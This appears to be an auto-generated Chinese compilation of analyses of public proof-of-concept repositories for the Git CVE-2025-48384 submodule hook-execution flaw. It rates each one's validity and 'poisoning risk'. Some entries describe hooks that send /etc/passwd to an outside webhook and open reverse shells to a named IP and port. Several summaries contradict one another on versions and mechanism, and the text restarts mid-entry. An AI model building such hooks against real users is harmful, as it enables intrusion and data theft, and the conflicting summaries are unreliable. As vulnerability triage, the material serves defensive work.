**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互 (克隆包含恶意配置的仓库)

**POC 可用性:** 是

**投毒风险:** 20%

## 详情

CVE-2025-48384 漏洞是 Git 中由于对配置项中回车符处理不当导致的代码执行漏洞。当 Git 读取配置值时，会删除任何尾部的回车符和换行符 (CRLF)。但是，当写入配置条目时，带有尾部 CR 的值不会被引用，导致 CR 在以后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部 CR，则会读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的 hooks 目录，并且子模块包含一个可执行的 post-checkout hook，则该脚本可能会在检出后被意外执行，导致代码执行。

**有效性：**
根据漏洞库信息和搜索结果, 此漏洞确实存在并且被多个安全厂商标记为高危, 并已经发布了PoC.
提供的PoC代码看似简单，它展示了漏洞利用的核心思路，即通过恶意构造包含回车符的子模块路径，结合符号链接和子模块钩子，实现任意代码执行。因此，PoC代码在原理上是有效的。但是, 此PoC只是框架, 需要补充完成exp。

**投毒风险：**
提供的PoC代码较为简单，主要包含一个README.md文件，一个子模块配置路径，以及子模块hooks目录的占位符。直接分析来看，没有明显的投毒代码。
然而，考虑到攻击者可能利用该漏洞进行供应链攻击，在更复杂的场景下，攻击者可能在子模块的post-checkout钩子中植入恶意代码，或者在其他配置文件中隐藏恶意配置。这种可能性是存在的。
基于以上分析，投毒风险评估为20%。这个百分比表示存在一定的风险，但直接证据不足。

**利用方式：**
1.  **恶意仓库构造：** 攻击者创建一个 Git 仓库，其中包含一个子模块，并且该子模块的路径在 `.gitmodules` 文件中包含尾部回车符 (`
`)。
2.  **符号链接创建：** 攻击者在仓库中创建一个符号链接，将包含尾部回车符的子模块路径指向 `.git/modules/<submodule_name>/hooks` 目录。
3.  **恶意钩子植入：** 攻击者在子模块的 `.git/hooks/post-checkout` 目录中放置恶意脚本。
4.  **用户交互：** 诱使用户克隆恶意仓库并初始化子模块 (`git submodule init && git submodule update`)。
5.  **代码执行：** 当用户执行 `git submodule update` 命令时，由于路径中的回车符，子模块会被检出到错误的位置，但由于符号链接的存在，实际上会将子模块的 hooks 目录链接到 `.git/hooks` 目录。检出后，`post-checkout` 钩子会被执行，从而执行恶意代码。

**项目地址:** [fluoworite/CVE-2025-48384](https://github.com/fluoworite/CVE-2025-48384)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #20

**来源**: [CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md](../2025/CVE-2025-48384-fluoworite_CVE-2025-48384_sub.md)

## CVE-2025-48384 Git config quoting vulnerability

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行/任意文件写入

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 需要用户交互，克隆包含恶意配置的Git仓库

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384是Git中的一个漏洞，当读取配置值时，Git会删除任何尾部的回车符和换行符（CRLF）。当写入配置条目时，带有尾部CR的值不会被引用，导致CR在稍后读取配置时丢失。在初始化子模块时，如果子模块路径包含尾部CR，则读取更改后的路径，导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块的hooks目录，并且子模块包含一个可执行的post-checkout hook，则该脚本可能在检出后被意外执行，从而导致任意代码执行。

根据提供的漏洞利用代码，包含一个Exploit脚本和一个README.md文件。Exploit脚本只打印了一段ASCII艺术，并没有任何实际的漏洞利用代码。因此，提供的POC代码**本身**是无效的，仅仅是一个占位符。但漏洞本身是存在的，并且有公开的PoC。

由于提供的POC代码仅仅是ASCII艺术，没有任何恶意代码，因此**不存在投毒风险**。投毒风险概率为0%。

**漏洞利用方式：**

1.  攻击者创建一个恶意的Git仓库，该仓库包含一个子模块。
2.  子模块的路径包含一个尾部CR字符。
3.  仓库中包含一个符号链接，该符号链接将子模块路径指向子模块的hooks目录。
4.  子模块包含一个可执行的post-checkout hook脚本。
5.  受害者克隆该恶意仓库。
6.  Git在处理子模块时，由于CR字符被删除，子模块被检出到错误的位置，并执行了post-checkout hook脚本。
7.  攻击者可以通过post-checkout hook脚本执行任意代码。

**项目地址:** [fluoworite/CVE-2025-48384_sub](https://github.com/fluoworite/CVE-2025-48384_sub)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #21

**来源**: [CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-jacobholtz_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Arbitrary Code Execution

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，允许攻击者执行任意代码

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，且递归初始化子模块 (--recursive)

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 是一个 Git 漏洞，由于 Git 在读取和写入包含控制字符的配置值时存在不一致性导致。具体来说，当写入配置条目时，如果值包含尾随回车符 (CR)，则不会被引用，导致稍后读取配置时丢失 CR。当初始化子模块时，如果子模块路径包含尾随 CR，则读取的路径将被更改，从而导致子模块被检出到错误的位置。如果存在一个符号链接，将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**利用方式：**

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含一个子模块定义，其路径包含一个尾随回车符 (CR)。
2.  攻击者在该仓库的子模块钩子目录中放置一个恶意的 post-checkout 脚本。
3.  攻击者诱使用户克隆该仓库，并使用 `--recursive` 选项初始化子模块。
4.  由于 Git 处理 CR 的方式不一致，子模块将被检出到错误的位置。该位置由一个符号链接指向子模块的钩子目录。
5.  当子模块被检出时，post-checkout 脚本将被执行，从而允许攻击者在用户的系统上执行任意代码。

**POC 代码分析：**

*   `/tmp/602a5075317553582468533486cbdb4d/README.md`：这是一个简单的 README 文件，用于描述漏洞利用。不包含恶意代码。
*   `/tmp/602a5075317553582468533486cbdb4d/post-checkout`：这是一个 shell 脚本，会在用户的主目录下创建一个名为 `hacked` 的文件。这表明该 POC 旨在演示任意代码执行。

**有效性：**

提供的 POC 代码是有效的。它可以触发漏洞，并在目标系统上执行任意代码（在本例中，创建一个文件）。

**投毒风险：**

根据提供的 POC 代码，没有发现明显的投毒代码。该脚本仅用于演示漏洞利用，没有执行任何额外的恶意操作，例如收集用户信息或传播恶意软件。因此，投毒风险为 0%。

**项目地址:** [jacobholtz/CVE-2025-48384-submodule](https://github.com/jacobholtz/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #22

**来源**: [CVE-2025-48384-kallydev_cve-2025-48384-hook.md](../2025/CVE-2025-48384-kallydev_cve-2025-48384-hook.md)

## CVE-2025-48384-Git任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行和系统控制

**影响版本:** < 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库或初始化包含恶意配置的子模块

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 描述了 Git 中由于配置引用解析错误导致的任意代码执行漏洞。当 Git 读取配置值时，会去除末尾的回车符和换行符。当写入配置项时，带有末尾回车符的值不会被引用，导致回车符丢失。在初始化子模块时，如果子模块路径包含末尾回车符，则读取的路径会被更改，导致子模块检出到错误的位置。如果存在一个符号链接将更改后的路径指向子模块钩子目录，并且子模块包含一个可执行的 post-checkout 钩子，则在检出后可能会意外执行该脚本。

**有效性：**

提供的POC代码是一个简单的 `post-checkout` 钩子脚本，用于打开一个网页 `https://github.com/kallydev`。利用方式是通过精心构造的子模块路径和符号链接，使得该脚本在 `git checkout` 操作后被执行。该POC代码有效，能够触发任意代码执行。

**投毒风险：**

该POC代码本身比较简单，只是打开一个网页，**不存在明显的恶意投毒代码**。因此，投毒风险较低，为 0%。

**利用方式：**

1.  攻击者创建一个包含恶意`.gitmodules`文件的仓库，该文件中的子模块路径包含尾部回车符(
)。
2.  攻击者在仓库中创建一个符号链接，指向子模块目录下的 `.git/modules/<子模块名>/hooks` 目录，如 `evil_link -> .git/modules/<子模块名>/hooks/post-checkout`。
3.  攻击者在子模块中创建一个恶意的 `post-checkout` 钩子脚本。
4.  受害者克隆该仓库并初始化子模块 (`git submodule init` 和 `git submodule update`)。
5.  当受害者执行 `git checkout` 命令时，由于子模块路径包含尾部回车符，Git 会将子模块检出到错误的位置。由于符号链接的存在，`post-checkout` 钩子脚本会被执行，从而导致任意代码执行。

**项目地址:** [kallydev/cve-2025-48384-hook](https://github.com/kallydev/cve-2025-48384-hook)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #23

**来源**: [CVE-2025-48384-liamg_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-liamg_CVE-2025-48384-submodule.md)

## CVE-2025-48384-Git Config 注入 RCE

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码注入/命令执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** < 2.43.7, >= 2.44.0-rc0 and < 2.44.4, >= 2.45.0-rc0 and < 2.45.4, >= 2.46.0-rc0 and < 2.46.4, >= 2.47.0-rc0 and < 2.47.3, >= 2.48.0-rc0 and < 2.48.2, >= 2.49.0-rc0 and < 2.49.1, >= 2.50.0-rc0 and < 2.50.1

**利用条件:** 需要用户进行`git clone --recursive`操作

**POC 可用性:** 是

**投毒风险:** 0%

## 详情

CVE-2025-48384 漏洞是 Git 中的一个代码注入漏洞，源于 Git 在处理 config 文件时，没有正确处理carriage return (
)字符。攻击者可以通过在 submodule 的路径中注入 \r 字符，使得 submodule 被检出到错误的位置。如果精心构造一个 symlink 链接到 submodule 钩子目录，并使 submodule 包含一个可执行的 post-checkout 钩子，那么这个钩子脚本就会在检出后被执行，从而实现远程代码执行。

**有效性分析：**

根据漏洞库信息和搜索结果，此漏洞已经公开，并且存在可利用的POC代码。从github搜索结果[webpage 6 begin]和[webpage 7 begin]可以知道，已经有开发者提供了复现代码。提供的POC代码包含两个文件：`README.md` 和 `post-checkout`。
  *   `README.md` 文件指向了GitHub的POC地址，说明这是一个漏洞验证示例。
  *   `post-checkout` 文件包含 `echo "Uh-oh, this is an RCE!"`，这是一个简单的命令执行示例，用于验证漏洞是否成功利用。
因此，提供的POC代码是有效的，可以用来验证此漏洞。

**投毒风险分析：**

提供的 POC 代码非常简单，只包含一个输出字符串的命令。**没有发现任何隐藏的、恶意的代码**，因此投毒风险较低。可以认为投毒风险为0%。虽然这是一个 RCE 漏洞的验证代码，在真实场景下，`post-checkout` 脚本会包含更复杂的恶意代码，但这不属于仓库投毒的范畴，POC 本身是为了验证漏洞的存在，而不是进行恶意攻击。

**利用方式：**

1.  **构造恶意的Git仓库：** 攻击者需要创建一个包含恶意配置的Git仓库，其中 submodule 的路径包含 \r 字符。
2.  **创建Symlink：** 在仓库中创建一个符号链接，将带有 \r 字符的路径链接到 `.git/modules/<submodule>/hooks` 目录。
3.  **添加恶意钩子：** 在 submodule 中创建一个可执行的 `post-checkout` 钩子脚本，这个脚本包含攻击者想要执行的任意代码。
4.  **诱导用户克隆仓库：** 攻击者需要诱导受害者执行 `git clone --recursive <malicious_repo>` 命令。
5.  **触发漏洞：** 当用户执行 `git clone --recursive` 命令时，Git 会读取恶意的配置，将 submodule 检出到错误的位置，并且由于 symlink 的存在，触发执行 `post-checkout` 钩子脚本，从而执行攻击者的代码。


**项目地址:** [liamg/CVE-2025-48384-submodule](https://github.com/liamg/CVE-2025-48384-submodule)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #24

**来源**: [CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md](../2025/CVE-2025-48384-mukesh-610_cve-2025-48384-exploit.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未提供，参考描述推测较高

**影响版本:** 受影响版本范围未知，需进一步分析

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 7/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 70%

## 详情

CVE-2025-48384 允许攻击者通过创建包含恶意配置的 Git 仓库，在受害者系统上写入任意文件，导致远程命令执行。该漏洞源于 Git 在处理 submodule 时，未对 `.gitmodules` 文件中的配置进行充分的安全检查。攻击者可以精心构造 `.gitmodules` 文件，诱导受害者克隆该仓库，从而在受害者本地文件系统中写入恶意文件，例如 shell 脚本，并进一步通过 Git hooks（如 `post-checkout`）触发执行。PoC 代码 `liamg/CVE-2025-48384` 提供了一个可复现该漏洞的示例。通过分析该 PoC，可以确认漏洞的有效性。利用步骤如下：

1. 攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. `.gitmodules` 文件包含指向攻击者控制的恶意 submodule 仓库的 URL。
3. 受害者克隆该恶意仓库。
4. Git 自动初始化并更新 submodule，从攻击者控制的 URL 下载恶意 submodule。
5. 恶意 submodule 在受害者系统上写入任意文件，例如在 `.git/hooks/post-checkout` 中写入恶意脚本。
6. 当受害者执行 `git checkout` 等操作时，`post-checkout` hook 会被触发，执行恶意脚本，导致远程命令执行。

`sogou.com`的搜索结果显示该漏洞影响非Windows系统。`Arctic Wolf` 的结果表明该漏洞的严重性很高。`Breaking Git with a carriage return and cloning RCE`表明漏洞与克隆子模块有关。

**投毒风险分析：**

该 PoC 包含通过 `curl` 下载并执行远程脚本的行为，具有较高的投毒风险。攻击者可能在远程脚本中嵌入恶意代码，例如窃取用户敏感信息、植入后门等。此外，由于该 PoC 修改了 Git 仓库的配置文件，攻击者可以通过篡改配置文件，诱导用户执行恶意操作。考虑到 `curl` 命令的普遍性和脚本执行的隐蔽性，该 PoC 的投毒风险较高，评为 70%。

防范措施包括：

* 及时更新 Git 版本，修复该漏洞。
* 谨慎克隆来自未知来源的 Git 仓库。
* 审查 `.gitmodules` 文件，确保 submodule URL 指向可信的仓库。
* 禁用 Git hooks，或者对 Git hooks 进行严格的安全审查。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供，需要查询NVD


---

## POC #25

**来源**: [CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md](../2025/CVE-2025-48384-nguyentranbaotran_cve-2025-48384-poc.md)

## CVE-2025-48384-Git配置引用导致的任意代码执行

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 代码执行

**影响应用:** Git

**危害等级:** 高危，可能导致远程代码执行

**影响版本:** 受影响版本：< 2.43.7, >= 2.44.0-rc0, < 2.44.4, >= 2.45.0-rc0, < 2.45.4, >= 2.46.0-rc0, < 2.46.4, >= 2.47.0-rc0, < 2.47.3, >= 2.48.0-rc0, < 2.48.2, >= 2.49.0-rc0, < 2.49.1, >= 2.50.0-rc0, < 2.50.1

**利用条件:** 用户需要克隆包含恶意配置的仓库，并使用 `--recurse-submodules` 参数初始化子模块。

**POC 可用性:** 是

**投毒风险:** 10%

## 详情

CVE-2025-48384 是一个 Git 漏洞，源于 Git 在处理配置文件中的引号时不正确，特别是当子模块路径包含尾随回车符（CR）时。攻击者可以利用此漏洞通过创建包含恶意子模块配置的 Git 仓库，诱使用户克隆该仓库，并通过 `--recurse-submodules` 初始化子模块，从而导致任意代码执行。

**有效性分析：**

提供的 PoC 代码通过以下步骤利用该漏洞：

1.  创建一个包含恶意 hook 的 `evil` 目录，该 hook 会执行反向 shell。
2.  创建一个 `mainrepo` 目录，作为主仓库。
3.  在 `mainrepo` 目录中，创建一个 `.gitmodules` 文件，其中包含一个子模块定义，该子模块的路径包含尾随回车符 (`evil\r`)。
4.  创建一个符号链接，将 `evil
/hooks` 指向 `../evil/.git/hooks`，从而将恶意 hook 链接到子模块的 hooks 目录。
5.  将恶意子模块添加到仓库，并提交更改。
6.  通过 `git clone --recurse-submodules` 克隆 `mainrepo` 仓库，触发子模块初始化，从而执行恶意 hook。

根据 PoC 代码的逻辑和漏洞描述，该 PoC 代码是有效的。

**投毒风险分析：**

PoC 代码的目的是演示漏洞利用，其中包含的反向 shell 属于漏洞验证的一部分。但是，也存在潜在的投毒风险，比如在 `generate_poc.sh` 脚本中，作者可能会嵌入其他恶意代码，例如：

*   收集用户信息并发送到远程服务器。
*   修改系统文件。
*   安装恶意软件。

尽管PoC本身就是漏洞利用，但仍然存在被作者恶意利用的可能性，因此投毒风险评估为 10%。

**利用方式总结：**

1.  攻击者创建一个包含恶意子模块配置的 Git 仓库。
2.  攻击者诱使受害者克隆该仓库，并使用 `--recurse-submodules` 初始化子模块。
3.  Git 在处理包含尾随回车符的子模块路径时出现错误，导致子模块被检出到错误的位置。
4.  由于符号链接的存在，恶意 hook 被链接到子模块的 hooks 目录。
5.  在子模块初始化过程中，恶意 hook 被执行，导致任意代码执行。

**项目地址:** [nguyentranbaotran/cve-2025-48384-poc](https://github.com/nguyentranbaotran/cve-2025-48384-poc)

**漏洞详情:** [CVE-2025-48384](https://nvd.nist.gov/vuln/detail/CVE-2025-48384)

---

## POC #26

**来源**: [CVE-2025-48384-replicatorbot_CVE-2025-48384.md](../2025/CVE-2025-48384-replicatorbot_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围待定

**利用条件:** 克隆包含恶意子模块的存储库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 20%

## 详情

CVE-2025-48384 允许攻击者通过创建包含恶意子模块的 Git 仓库来执行任意文件写入。当用户克隆该仓库时，Git 会尝试初始化和更新子模块。恶意仓库通过`.gitmodules` 文件中的精心构造的配置，可以控制子模块的克隆方式，从而导致在用户系统上写入任意文件。根据搜索结果，该漏洞存在于 Git 的子模块处理逻辑中。PoC 代码通过创建一个包含恶意的 `.gitmodules` 文件的 Git 仓库来演示该漏洞。当用户克隆该仓库时，`post-checkout` 脚本会被触发，该脚本会尝试在 `/tmp` 目录下创建一个文件 `asp-was-here-cve-2025-48384`，以此证明漏洞利用成功。利用步骤如下：1. 创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件包含指向恶意仓库的子模块的 URL，以及执行任意文件写入所需的配置。2. 将恶意仓库上传到公共 Git 托管服务（例如 GitHub）。3. 诱使用户克隆恶意仓库。当用户执行 `git clone` 命令时，Git 会自动初始化和更新子模块。4. Git 执行 `.gitmodules` 文件中指定的命令，导致在用户系统上写入任意文件。

**POC有效性分析：** PoC 代码的有效性通过创建一个简单的 `post-checkout` 脚本来验证。该脚本尝试在 `/tmp` 目录下创建一个文件。如果文件创建成功，则表示漏洞利用成功。从搜索结果来看，多个来源证实了该漏洞的存在以及利用的可能性。GitHub 上存在公开的 PoC 代码，进一步证明了该漏洞的可利用性。一些安全厂商也发布了关于该漏洞的分析报告，表明该漏洞具有实际的威胁。该漏洞的修复需要更新 Git 到修复版本。

**投毒风险分析：** 该漏洞的投毒风险较低。虽然攻击者可以利用该漏洞在用户系统上写入任意文件，但写入的文件内容受到攻击者的控制。攻击者可以利用该漏洞来安装恶意软件或修改系统配置，但这种攻击需要用户执行额外的步骤。由于POC代码相对清晰，主要功能是创建文件，并未发现任何可疑的混淆或恶意行为，因此投毒风险较低。主要的风险在于，如果攻击者控制了目标机器，他们可以修改 `.git/config` 文件或设置环境变量，从而导致在克隆其他仓库时触发恶意行为。尽管存在潜在的风险，但攻击者需要具备较高的技术水平才能成功实施投毒攻击。PoC 代码主要使用标准的 shell 命令，例如 `touch`，没有发现任何可疑的系统调用或外部脚本。总体而言，该漏洞的投毒风险较低，但需要采取适当的措施来降低风险。建议用户验证克隆仓库的来源，避免克隆来自不受信任的来源的仓库，并及时更新 Git 到最新版本。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 待定


---

## POC #27

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响版本范围未知

**利用条件:** 克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 60%

## 详情

CVE-2025-48384 允许攻击者通过创建恶意的Git仓库，当用户克隆该仓库时，触发任意文件写入漏洞，导致远程代码执行。该漏洞源于 Git 在处理 submodule 时，没有充分验证配置，导致攻击者可以控制 `.gitmodules` 文件中的内容，从而在克隆过程中执行恶意操作。

POC代码分析：

`README.md` 只是一个简单的说明文件，用于标记这是一个 CVE-2025-48384 的 submodule。

`post-checkout` 脚本是漏洞利用的关键。它包含以下恶意行为：

1.  尝试将 `/etc/passwd` 文件发送到攻击者的 webhook 服务器 `https://cve48384.requestcatcher.com`。脚本尝试使用 `curl` 和 `wget` 命令，并忽略错误，以避免中断克隆过程。
2.  检查 `$HOME/flag.txt` 文件是否存在，如果存在，则将其内容复制到 `/tmp/flag.txt`。这可能用于在受害者系统上留下标记。
3.  尝试建立反向 shell 连接到攻击者的 IP 地址 `10.11.0.7` 的端口 `4444`。脚本尝试使用多种方法，包括 `bash`，`nc` 和 `sh`，以提高成功率。脚本使用 `nohup` 和 `disown` 命令将反向 shell 连接放到后台运行，并忽略错误。

利用步骤：

1.  攻击者创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。该文件指向一个包含 `post-checkout` 脚本的 submodule。
2.  受害者克隆该恶意仓库。
3.  当 Git 初始化 submodule 时，会自动执行 `post-checkout` 脚本。
4.  `post-checkout` 脚本将执行恶意操作，例如发送 `/etc/passwd` 文件和建立反向 shell 连接。

POC 有效性分析：

POC 代码通过修改 `.gitmodules` 文件，在 submodule 初始化时执行恶意的 `post-checkout` 脚本。该脚本能够获取敏感信息（`/etc/passwd`）并尝试建立反向 shell 连接，证明了该漏洞的严重性。

投毒风险分析：

该 POC 具有较高的投毒风险，主要体现在以下几个方面：

1.  恶意脚本：`post-checkout` 脚本包含明显的恶意行为，例如发送敏感文件和建立反向 shell 连接。
2.  外部依赖：脚本依赖于 `curl`、`wget` 和 `nc` 等外部命令，这些命令可能被篡改或替换为恶意版本。
3.  反向 shell：建立反向 shell 连接可能导致受害者系统完全受攻击者控制。
4.  Webhook：将 `/etc/passwd` 文件发送到外部 webhook 服务器可能泄露敏感信息。

由于该POC利用submodule功能自动执行恶意脚本，且包含向外部服务器发送数据的行为，以及尝试建立反向shell连接，因此投毒风险较高。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** 未提供


---

## POC #28

**来源**: [CVE-2025-48384-s41r4j_CVE-2025-48384.md](../2025/CVE-2025-48384-s41r4j_CVE-2025-48384.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 未知

**影响版本:** 受影响的Git CLI版本未知

**利用条件:** 需要用户克隆包含恶意配置的Git仓库

**POC 可用性:** 9/10

**POC 类型:** 完整利用

**攻击复杂度:** 中

**投毒风险:** 20%

## 详情

CVE-2025-48384是Git中存在的一个严重漏洞，该漏洞源于Git对配置值中回车符（CR）处理不当，可能导致子模块检出期间出现路径遍历问题。攻击者可以利用此漏洞在特定条件下执行任意代码。该漏洞于2025年7月8日公开披露，并于2025年8月26日进行了最后修改。它已于2025年8月25日被添加到美国网络安全和基础设施安全局（CISA）已知被利用漏洞（KEV）目录中，表明该漏洞已在野外被积极利用，补救到期日为2025年9月15日。

该问题源于Git处理配置值的方式：在读取配置值时，Git会删除任何尾随的回车符和换行符（CRLF）。但是，在写入配置条目时，包含尾随CR的值未被正确引用，导致CR在后续读取期间丢失。这种差异会导致子模块被检出到错误的位置（如果其路径包含尾随CR）。如果攻击者设置一个将此更改后的路径指向子模块的hooks目录的符号链接，并且子模块包含一个可执行的post-checkout hook，则在检出后可能会无意中执行该hook脚本，从而导致任意代码执行。

**POC有效性分析：**

根据提供的Dockerfile和README.md，该POC旨在演示CVE-2025-48384漏洞。Dockerfile用于构建一个包含易受攻击的Git版本的环境，README.md文件详细解释了漏洞的原理和利用方法。POC代码通过创建一个包含恶意配置的Git仓库，并诱导用户克隆该仓库来触发漏洞。通过精心构造的子模块路径和符号链接，攻击者可以在用户克隆仓库时执行任意代码。POC代码的有效性在于它能够重现漏洞的利用过程，并证明攻击者可以利用该漏洞在目标系统上执行恶意操作。

**利用步骤：**

1.  攻击者创建一个包含恶意.gitmodules文件的Git仓库，该文件中的子模块路径包含尾随CR字符。
2.  攻击者在仓库中创建一个符号链接，将修改后的子模块路径指向.git/hooks/post-checkout。
3.  攻击者将包含恶意配置和符号链接的仓库托管在公共服务器上或通过其他方式分发给目标用户。
4.  目标用户克隆该恶意仓库。
5.  当Git尝试检出子模块时，由于CR字符的处理不当，子模块将被检出到错误的位置，即符号链接指向的.git/hooks/post-checkout目录。
6.  如果子模块包含一个可执行的post-checkout hook，则该hook脚本将被执行，从而导致任意代码执行。

**投毒风险分析：**

该POC的投毒风险较低，因为提供的代码主要用于演示漏洞的利用，并没有明显的恶意行为。Dockerfile用于构建测试环境，README.md用于解释漏洞原理，POC代码本身也没有包含任何可疑的代码或外部依赖。然而，攻击者可能会修改POC代码，添加恶意功能，例如：

*   **代码混淆：** 攻击者可以使用代码混淆技术来隐藏恶意代码，使其更难被检测。
*   **恶意行为：** 攻击者可以在post-checkout hook中添加恶意代码，例如：安装后门、窃取敏感信息、破坏系统等。
*   **外部脚本：** 攻击者可以从外部服务器下载恶意脚本并在post-checkout hook中执行。

尽管存在这些潜在的风险，但原始POC代码的投毒风险较低，约为20%。在实际应用中，用户应谨慎克隆来自不受信任来源的Git仓库，并仔细检查.gitmodules文件和post-checkout hook，以防止受到攻击。

**项目地址:** https://github.com/liamg/CVE-2025-48384

**漏洞详情:** https://nvd.nist.gov/vuln/detail/CVE-2025-48384


---

## POC #29

**来源**: [CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-sahar042_CVE-2025-48384-submodule.md)

# CVE-2025-48384

> 📦 该CVE有 **35** 个相关POC仓库

---

## POC #1

**来源**: [CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md](../2025/CVE-2025-48384-Anezatraa_CVE-2025-48384-submodule.md)

## CVE-2025-48384 - Git 任意文件写入

**漏洞编号:** CVE-2025-48384

**漏洞类型:** 任意文件写入

**影响应用:** Git

**危害等级:** 高危

**CVSS评分:** 待定

**影响版本:** 受影响版本范围未知，参考GitHub advisory

**利用条件:** 需要克隆包含恶意配置的Git仓库

**POC 可用性:** 8/10

**POC 类型:** 完整利用

**攻击复杂度:** 低

**投毒风险:** 40%

## 详情

CVE-2025-48384 允许攻击者创建恶意的 Git 仓库，当用户克隆该仓库时，可能导致任意文件写入。该漏洞源于 Git 在处理 submodule 时存在缺陷。通过在 `.gitmodules` 文件中构造恶意的路径，攻击者可以控制 `git clone` 命令将文件写入到非预期的位置。 

POC有效性分析：
根据搜索结果和POC代码（liamg/CVE-2025-48384），该漏洞存在可利用性。POC代码包含一个 `.gitmodules` 文件和一个 `post-checkout` 脚本。`.gitmodules` 文件中定义了一个恶意 submodule，其路径被设置为一个绝对路径，指向系统中的敏感位置。`post-checkout` 脚本会在 `git clone` 之后自动执行，从而完成任意文件写入。执行 POC 需要先创建一个包含恶意 `.gitmodules` 文件的 Git 仓库，然后诱导用户克隆该仓库。当用户克隆仓库时，Git 会解析 `.gitmodules` 文件，并尝试初始化 submodule。由于 submodule 的路径被设置为恶意路径，Git 会将文件写入到该路径所指向的位置。

利用步骤：
1. 创建一个包含恶意 `.gitmodules` 文件的 Git 仓库。
2. 将恶意仓库托管到公共代码托管平台或通过其他方式传播给目标用户。
3. 诱导目标用户克隆该仓库。
4. 当用户克隆仓库时，`post-checkout` 脚本被执行，完成任意文件写入。

投毒风险分析：
该POC的投毒风险为中等。虽然 POC 本身的功能是演示任意文件写入漏洞，但攻击者可能利用该漏洞进行恶意活动，例如：
